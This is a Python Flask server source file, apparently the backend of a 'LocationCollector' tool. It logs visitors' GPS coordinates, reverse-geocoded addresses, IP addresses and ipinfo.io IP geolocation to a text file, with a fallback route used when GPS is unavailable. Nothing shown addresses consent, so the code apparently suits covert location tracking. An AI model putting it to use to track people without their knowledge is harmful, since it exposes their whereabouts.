from flask import Flask, request, jsonify
from datetime import datetime
import threading
import time
import requests
import json
import os

app = Flask(__name__)

# Global lock and timestamp for rate limiting Nominatim API
nominatim_lock = threading.Lock()
last_nominatim_call = 0

LOG_FILE = 'location_logs.txt'

# Helper to log data with timestamp

def log_data(data: str):
    timestamp = datetime.utcnow().isoformat() + 'Z'
    with open(LOG_FILE, 'a', encoding='utf-8') as f:
        f.write(f'[{timestamp}] {data}\n')

# Helper to get client IP from request

def get_client_ip():
    if request.headers.get('X-Forwarded-For'):
        return request.headers.get('X-Forwarded-For').split(',')[0].strip()
    return request.remote_addr

@app.route('/collect', methods=['POST'])
def collect():
    global last_nominatim_call
    data = request.get_json(force=True)
    latitude = data.get('latitude')
    longitude = data.get('longitude')

    if latitude is None or longitude is None:
        return jsonify({'error': 'Missing latitude or longitude'}), 400

    client_ip = get_client_ip()

    # Rate limit Nominatim API calls
    with nominatim_lock:
        now = time.time()
        elapsed = now - last_nominatim_call
        if elapsed < 1.0:
            time.sleep(1.0 - elapsed)
        last_nominatim_call = time.time()

    # Reverse geocode using OpenStreetMap Nominatim API
    nominatim_url = f'https://nominatim.openstreetmap.org/reverse?format=jsonv2&lat={latitude}&lon={longitude}'
    headers = {'User-Agent': 'Mozilla/5.0 (compatible; LocationCollector/1.0)'}
    try:
        resp = requests.get(nominatim_url, headers=headers, timeout=5)
        if resp.status_code == 200:
            nominatim_data = resp.json()
            address = nominatim_data.get('display_name', 'Unknown')
        else:
            address = 'Unknown'
    except Exception:
        address = 'Unknown'

    log_entry = f'GPS: {latitude},{longitude} | Address: {address} | IP: {client_ip}'
    log_data(log_entry)

    return jsonify({'status': 'success'})

@app.route('/collect-fallback', methods=['POST'])
def collect_fallback():
    data = request.get_json(force=True)
    client_ip = get_client_ip()

    # Get IP geolocation from ipinfo.io
    ipinfo_url = f'https://ipinfo.io/{client_ip}/json'
    try:
        resp = requests.get(ipinfo_url, timeout=5)
        if resp.status_code == 200:
            ipinfo_data = resp.json()
        else:
            ipinfo_data = {}
    except Exception:
        ipinfo_data = {}

    log_entry = f'Fallback data: {json.dumps(data)} | IP info: {json.dumps(ipinfo_data)} | IP: {client_ip}'
    log_data(log_entry)

    return jsonify({'status': 'success'})

if __name__ == '__main__':
    import sys
    port = int(sys.argv[1]) if len(sys.argv) > 1 else int(os.environ.get('PORT', 5000))

    # Disable HTTPS on Railway (handled by platform)
    if os.environ.get('RAILWAY') == 'true':
        print(f'Running on Railway with HTTP on port {port}')
        app.run(host='0.0.0.0', port=port)
    else:
        ssl_cert = 'cert.pem'
        ssl_key = 'key.pem'

        if not os.path.exists(ssl_cert) or not os.path.exists(ssl_key):
            print('SSL certificate or key not found. Please provide cert.pem and key.pem files.')
            exit(1)

        app.run(host='0.0.0.0', port=443, ssl_context=(ssl_cert, ssl_key))
